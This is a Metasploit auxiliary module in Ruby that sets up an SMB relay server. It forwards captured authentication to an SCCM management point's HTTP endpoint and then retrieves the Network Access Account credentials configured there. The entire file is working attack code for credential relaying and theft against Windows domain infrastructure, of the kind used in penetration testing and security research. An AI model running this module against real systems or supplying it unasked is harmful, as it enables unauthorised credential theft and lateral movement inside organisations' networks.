##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include ::Msf::Exploit::Remote::SMB::RelayServer
  include ::Msf::Exploit::Remote::HTTP::SCCM

  def initialize
    super({
      'Name' => 'SMB to HTTP relay version of Get NAA Creds',
      'Description' => %q{
              This module creates an SMB server and then relays the credentials passed to it to SCCM's HTTP server
              (aka Management Point) to gain an authenticated connection. Once authenticated it then attempts to retrieve
              the Network Access Account(s), if configured, from the SCCM server. This requires a computer account,
              which can be added using the samr_account module.

              If you have domain credentials but are unsure of the either the MANAGEMENT_POINT or SITE_CODE for the
              SCCM server, the original (non-relay) version of this module has an auto discovery feature which will use
              domain credentials to run an LDAP query to find both the MANAGEMENT_POINT and the SITE_CODE.
            },
      'Author' => [
        'xpn', # Initial research
        'skelsec', # Initial obfuscation port
        'smashery', # original module author
        'jheysel-r7' # added relay capability
      ],
      'References' => [
        ['URL', 'https://blog.xpnsec.com/unobfuscating-network-access-accounts/'],
        ['URL', 'https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-2/cred-2_description.md'],
        ['URL', 'https://github.com/Mayyhem/SharpSCCM'],
        ['URL', 'https://github.com/garrettfoster13/sccmhunter']
      ],
      'DefaultOptions' => {
        'RPORT' => 80
      },
      'License' => MSF_LICENSE,
      'Actions' => [[ 'Relay', { 'Description' => 'Run SMB SCCM relay server' } ]],
      'PassiveActions' => [ 'Relay' ],
      'DefaultAction' => 'Relay'
    })

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The URI for the cert server.', '/' ]),
        OptBool.new('RANDOMIZE_TARGETS', [true, 'Whether the relay targets should be randomized', true]),
        OptString.new('MANAGEMENT_POINT', [ true, 'The management point (SCCM server) to use' ]),
        OptString.new('SITE_CODE', [ true, 'The site code to use on the management point' ]),
        OptString.new('DOMAIN', [ true, 'The domain to authenticate to', '' ])
      ]
    )

    deregister_options('LDAPDomain') # deregister LDAPDomain because DOMAIN is registered and used for both LDAP and HTTP
  end

  def relay_targets
    Msf::Exploit::Remote::SMB::Relay::TargetList.new(
      (datastore['SSL'] ? :https : :http),
      datastore['RPORT'],
      datastore['RELAY_TARGETS'],
      '/ccm_system_windowsauth/request',
      randomize_targets: datastore['RANDOMIZE_TARGETS'],
      protocol_options: { http_status_code: 403 }
    )
  end

  def check_host(target_ip)
    res = send_request_raw(
      {
        'rhost' => target_ip,
        'method' => 'GET',
        'uri' => normalize_uri('/ccm_system_windowsauth/request'),
        'headers' => {
          'Accept-Encoding' => 'identity'
        }
      }
    )
    disconnect

    return Exploit::CheckCode::Detected if res&.code == 401

    Exploit::CheckCode::Unknown
  end

  def run
    # check_options
    relay_targets.each do |target|
      print_status("Checking endpoint on #{target}")
      check_code = check_host(target.ip)
      case check_code
      when Exploit::CheckCode::Unknown
        fail_with(Failure::UnexpectedReply, "SCCM HTTP server does not appear to be running on #{target}")
      when Exploit::CheckCode::Detected
        print_good("SCCM HTTP server appears to be running on #{target}")
      end
    end

    start_service
    print_status('Server started.')

    # Wait on the service to stop
    service.wait if service
  end

  def on_relay_success(relay_connection:, relay_identity:)
    opts = { 'client' => relay_connection }
    computer_user = relay_identity.split('\\').last.delete_suffix('$')
    get_naa_credentials(opts, datastore['MANAGEMENT_POINT'], datastore['SITE_CODE'], computer_user)
  end
end
